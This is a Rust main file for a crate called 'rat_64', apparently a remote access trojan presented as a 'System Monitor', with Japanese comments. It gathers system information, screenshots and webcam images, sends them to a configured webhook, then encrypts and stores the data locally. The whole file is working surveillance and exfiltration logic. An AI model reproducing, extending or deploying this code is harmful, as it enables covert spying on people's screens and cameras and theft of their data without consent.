use std::fs::File;
use std::io::Write;
use rmp_serde::encode::to_vec as to_msgpack_vec;
use base64::{engine::general_purpose, Engine as _};
use rand::Rng;

use rat_64::{
    WebhookType, FullSystemData,
    get_system_info, load_config,
    send_webhook, get_screenshot_base64, get_webcam_image_base64,
    encrypt_data
};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("🔍 RAT-64 System Monitor 開始");
    
    // 設定読み込み
    let config = load_config();
    println!("📋 設定読み込み完了: {:?}", config.webhook_type);
    
    // システム情報収集
    println!("📊 システム情報を収集中...");
    let system_info = get_system_info();
    println!("✅ システム情報収集完了");
    
    // 画像取得（設定による）
    let screenshot = if config.collect_screenshots {
        println!("📸 スクリーンショット取得中...");
        get_screenshot_base64()
    } else {
        String::new()
    };
    
    let webcam = if config.collect_webcam {
        println!("📹 Webカメラ画像取得中...");
        get_webcam_image_base64()
    } else {
        String::new()
    };
    
    // Webhook送信
    if matches!(config.webhook_type, WebhookType::None) {
        println!("⚠️  Webhook設定なし - データをローカルファイルに保存します");
    } else {
        println!("🔗 Webhook送信中...");
        if let Err(e) = send_webhook(&config, &system_info, &screenshot) {
            println!("❌ Webhook送信失敗: {}", e);
        }
    }
    
    // 全データの統合
    let full_data = FullSystemData {
        system_info,
        screenshot: screenshot.clone(),
        webcam_image: webcam,
    };
    
    // データシリアライゼーション
    println!("📦 データをMessagePackでシリアライズ中...");
    let data = to_msgpack_vec(&full_data)?;
    
    // 暗号化キー生成
    let mut key = [0u8; 32];
    let mut nonce = [0u8; 12];
    rand::rng().fill(&mut key);
    rand::rng().fill(&mut nonce);
    
    // データ暗号化
    println!("🔐 データを暗号化中...");
    let encrypted_data = encrypt_data(&data, &key, &nonce)?;
    
    // 暗号化データ保存（バイナリ形式）
    let mut file = File::create("data.dat")?;
    file.write_all(&encrypted_data)?;
    println!("💾 暗号化データを data.dat に保存しました");
    
    // キーとNonceを保存（セキュリティのため別ファイル）
    println!("🔑 暗号化キーを保存中...");
    save_key_and_nonce(&key, &nonce)?;
    
    println!("✅ 全ての処理が完了しました！");
    println!("📝 復号化するには: cargo run --bin decrypt data.dat");
    println!("🔍 キーを確認するには: cargo run --bin show_key key.dat");
    
    Ok(())
}

fn save_key_and_nonce(key: &[u8; 32], nonce: &[u8; 12]) -> Result<(), Box<dyn std::error::Error>> {
    // Base64エンコード
    let key_b64 = general_purpose::STANDARD.encode(key);
    let nonce_b64 = general_purpose::STANDARD.encode(nonce);
    
    // キーファイルに保存（バイナリ形式）
    let key_data = format!("KEY:{}\nNONCE:{}", key_b64, nonce_b64);
    let mut key_file = File::create("key.dat")?;
    key_file.write_all(key_data.as_bytes())?;
    
    println!("🔐 暗号化キーとNonceを key.dat に保存しました");
    Ok(())
}